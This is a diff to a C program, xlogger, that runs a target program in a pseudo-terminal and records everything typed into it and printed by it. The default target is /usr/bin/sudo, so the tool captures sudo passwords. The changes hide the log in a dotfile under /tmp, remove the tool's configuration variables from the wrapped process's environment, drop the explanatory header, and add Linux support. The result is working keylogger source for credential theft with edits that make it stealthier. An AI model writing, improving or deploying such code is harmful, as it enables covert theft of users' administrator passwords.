@@ -1,11 +1,6 @@
-/*
- * xlogger - Keyboard input and console output logger for any program
- * 
- * Configuration:
- * - TARGET_PROGRAM: Path to the target program to monitor
- * - log_keyboard_input: Set to 1 to enable keyboard input logging (default: 1)
- * - log_console_output: Set to 1 to enable console output logging (default: 1)
- */
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -17,11 +12,18 @@
 #include <signal.h>
 #include <sys/select.h>
 #include <sys/wait.h>
+#include <sys/types.h>
 #include <termios.h>
-#include <util.h>
 
-#define TARGET_PROGRAM "/usr/bin/sudo"
-#define LOG_FILE "/tmp/xlogger.log"
+#ifdef __APPLE__
+#include <util.h>
+#else
+#include <pty.h>
+#include <utmp.h>
+#endif
+
+#define DEFAULT_XPROGRAM "/usr/bin/sudo"
+#define DEFAULT_XLOGFILE "/tmp/.xlogger.log"
 #define BUFFER_SIZE 4096
 #define INPUT_LINE_BUFFER_SIZE 1024
 
@@ -38,6 +40,11 @@ static FILE *log_fp = NULL;
 static pid_t child_pid = -1;
 static char input_line_buffer[INPUT_LINE_BUFFER_SIZE];
 static size_t input_line_pos = 0;
+
+static const char *target_program = NULL;
+static const char *log_file_path = NULL;
+
+extern char **environ;
 
 
 
@@ -146,8 +153,59 @@ void log_output(const char *data, size_t len) {
     fflush(log_fp);
 }
 
+char **create_filtered_environ(void) {
+    int env_count = 0;
+    int filtered_count = 0;
+    
+    // 计算环境变量总数
+    while (environ[env_count] != NULL) {
+        env_count++;
+    }
+    
+    // 分配新的环境变量数组
+    char **new_environ = malloc((env_count + 1) * sizeof(char *));
+    if (!new_environ) {
+        return NULL;
+    }
+    
+    // 复制环境变量，排除XPROGRAM和XLOGFILE
+    for (int i = 0; i < env_count; i++) {
+        if (strncmp(environ[i], "XPROGRAM=", 9) != 0 && 
+            strncmp(environ[i], "XLOGFILE=", 9) != 0) {
+            new_environ[filtered_count] = strdup(environ[i]);
+            if (!new_environ[filtered_count]) {
+                // 内存分配失败，清理已分配的内存
+                for (int j = 0; j < filtered_count; j++) {
+                    free(new_environ[j]);
+                }
+                free(new_environ);
+                return NULL;
+            }
+            filtered_count++;
+        }
+    }
+    
+    new_environ[filtered_count] = NULL;
+    return new_environ;
+}
+
+void free_environ(char **env) {
+    if (!env) return;
+    
+    for (int i = 0; env[i] != NULL; i++) {
+        free(env[i]);
+    }
+    free(env);
+}
+
 int setup_terminal(void) {
     struct termios new_termios;
+    
+    // 检查 STDIN 是否是一个真实的终端
+    if (!isatty(STDIN_FILENO)) {
+        // 不是终端设备，跳过终端设置
+        return 0;
+    }
     
     if (tcgetattr(STDIN_FILENO, &original_termios) < 0) {
         perror("tcgetattr");
@@ -189,8 +247,15 @@ int create_pty_and_fork(char **argv) {
             _exit(1);
         }
         
-        execv(TARGET_PROGRAM, argv);
-        perror("execv");
+        char **filtered_env = create_filtered_environ();
+        if (filtered_env) {
+            execve(target_program, argv, filtered_env);
+            free_environ(filtered_env);
+        } else {
+            // 如果过滤环境变量失败，回退到使用原始环境变量
+            execve(target_program, argv, environ);
+        }
+        perror("execve/execv");
         _exit(1);
     }
     
@@ -246,7 +311,18 @@ void io_loop(void) {
 int main(int argc, char *argv[]) {
     int status;
     
-    log_fp = fopen(LOG_FILE, "a");
+    // 优先从环境变量获取配置
+    target_program = getenv("XPROGRAM");
+    if (!target_program) {
+        target_program = DEFAULT_XPROGRAM;
+    }
+    
+    log_file_path = getenv("XLOGFILE");
+    if (!log_file_path) {
+        log_file_path = DEFAULT_XLOGFILE;
+    }
+    
+    log_fp = fopen(log_file_path, "a");
     if (!log_fp) {
         perror("fopen log file");
         return 1;
@@ -265,11 +341,12 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    fprintf(log_fp, "\n=== New session started: %s ===\n", TARGET_PROGRAM);
+    fprintf(log_fp, "\n========= New session started ======\n");
+    fprintf(log_fp, "cmdline: %s", target_program);
     for (int i = 1; i < argc; i++) {
-        fprintf(log_fp, "Arg[%d]: %s\n", i, argv[i]);
+        fprintf(log_fp, " %s", argv[i]);
     }
-    fprintf(log_fp, "=====================================\n");
+    fprintf(log_fp, "\n====================================\n");
     fflush(log_fp);
     
     io_loop();
